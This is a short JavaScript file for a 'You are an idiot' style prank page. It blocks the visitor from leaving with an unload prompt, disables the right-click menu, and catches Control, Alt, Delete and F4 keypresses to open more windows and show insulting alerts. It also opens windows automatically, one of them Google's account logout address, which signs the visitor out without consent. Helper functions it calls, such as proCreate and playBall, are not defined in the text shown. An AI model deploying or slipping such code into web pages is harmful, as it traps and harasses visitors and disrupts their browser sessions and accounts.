window.onbeforeunload = () => "Are you an idiot?";
window.oncontextmenu = () => false;
window.onkeydown = async () => {
	if (['Control', 'Alt', 'Delete', 'F4'].includes(event.key)) {
		await proCreate(6);
		alert("You are an idiot!");
	}
	
	return null;
}
async function handleClick() {
	await proCreate(6,"troll.html");
	window.onbeforeunload = () => "Are you an idiot?";
};
window.onload = playBall;

alert("YOU ARE AN IDIOT!! HGAHAHAHA");
proCreate(3,"https://www.google.com/accounts/Logout")
